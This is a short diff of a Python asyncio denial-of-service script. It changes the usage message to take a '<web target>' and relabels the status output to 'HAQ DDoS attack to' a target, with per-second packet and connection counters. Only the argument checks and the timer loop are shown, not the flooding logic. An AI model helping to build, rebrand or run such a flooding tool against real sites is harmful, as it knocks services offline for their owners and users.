@@ -23,7 +23,7 @@ async def main():
     
     try:
 
-        assert len(args) == 5, "python3 %s <target> <workers> <rpc> <timer>" % args[0]
+        assert len(args) == 5, "python3 %s <web target> <workers> <rpc> <time>" % args[0]
         assert URL(args[1]) or None, "Invalid url"
         assert args[2].isdigit(), "Invalid workers integer"
         assert args[3].isdigit(), "Invalid connection pre seconds"
@@ -48,13 +48,13 @@ async def main():
             await sleep(.0)
             
         event.set()
-        print("BAIHU send packet to %s" % target.human_repr())
+        print("HAQ DDoS attack to %s" % target.human_repr())
 
         while timer:
             pps, cps = 0, 0
             await sleep(1)
             timer -= 1
-            print(f"PPS: {pps:,} | CPS: {cps:,} | Time Remaining: {timer:,}s")
+            print(f"PPS: {pps:,} | CPS: {cps:,} | Time : {timer:,}s")
         event.clear()
     except AssertionError as e:
         print(str(e) or repr(e))
